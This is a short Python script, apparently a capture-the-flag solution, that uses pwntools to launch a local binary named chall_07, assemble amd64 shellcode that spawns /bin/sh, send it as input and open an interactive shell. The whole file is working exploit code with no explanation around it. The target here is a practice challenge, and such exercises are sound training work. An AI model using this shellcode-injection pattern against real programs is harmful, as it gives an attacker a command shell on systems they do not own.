# coding: utf-8
from pwn import *
pr = process("./chall_07")
context.arch = "amd64"
asm_shell = asm(shellcraft.sh())
pr.sendline(asm_shell)
pr.interactive()
pr.close()
